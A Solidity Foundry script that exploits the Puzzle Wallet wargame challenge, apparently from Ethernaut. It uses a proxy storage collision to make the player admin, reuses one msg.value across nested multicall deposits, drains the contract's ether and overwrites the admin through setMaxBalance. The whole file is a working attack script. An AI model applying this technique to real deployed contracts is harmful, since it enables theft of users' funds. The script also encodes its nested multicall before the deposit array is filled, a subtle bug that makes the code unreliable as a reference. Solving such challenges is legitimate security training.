// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/puzzleWallet.sol"; // Import the PuzzleWallet contract interface
import "forge-std/Script.sol"; // Import Foundry utilities for scripting
import "forge-std/console.sol"; // Import console for logging (if needed)

// Main script to exploit the Puzzle Wallet challenge
contract PuzzleWalletExploit is Script {
    bytes[] public depositCalls; // Array to store individual deposit payloads
    bytes[] public multiCallPayload; // Array to build the final multicall payload

    // Address of the deployed PuzzleProxy instance (replace with actual address)
    address public puzzleProxyInstance = 0xYourInstanceAddressHere; 
    uint256 convertedValue = uint256(uint160(0xYourPlayerAddressHere));

    // Payloads for each function call in the attack sequence
    bytes public whitelistPayload = abi.encodeWithSignature("addToWhitelist(address)", 0xYourPlayerAddressHere);
    bytes public depositPayload = abi.encodeWithSignature("deposit()");
    bytes public nestedMulticallPayload = abi.encodeWithSignature("multicall(bytes[])", depositCalls);
    bytes public executePayload = abi.encodeWithSignature(
        "execute(address,uint256,bytes)", 
        0xYourPlayerAddressHere, 
        0.002 ether, 
        ""
    );
    bytes public setMaxBalancePayload = abi.encodeWithSignature("setMaxBalance(uint256)", convertedValue);

    // Entry point for the script
    function run() external {
        // Prepare the nested payloads for the multicall
        depositCalls.push(depositPayload); // Add a deposit payload to the first multicall
        multiCallPayload.push(depositPayload); // Add another deposit
        multiCallPayload.push(nestedMulticallPayload); // Add the nested multicall
        multiCallPayload.push(executePayload); // Add the execute call to transfer ether

        // Encode the entire attack as a single multicall payload
        bytes memory completeMulticall = abi.encodeWithSignature("multicall(bytes[])", multiCallPayload);

        vm.startBroadcast(vm.envUint("PRIVATE_KEY")); // Start transaction broadcast

        // Step 1: Change the proposed admin to the attacker's address
        PuzzleProxy(payable(puzzleProxyInstance)).proposeNewAdmin(0xYourPlayerAddressHere);

        // Step 2: Whitelist the attacker's address
        puzzleProxyInstance.call(whitelistPayload);

        // Step 3: Perform the multicall to drain funds and exploit wallet logic
        puzzleProxyInstance.call{value: 0.001 ether}(completeMulticall);

        // Step 4: Set a new maximum balance to take over the contract
        puzzleProxyInstance.call(setMaxBalancePayload);

        vm.stopBroadcast(); // End the broadcast
    }
}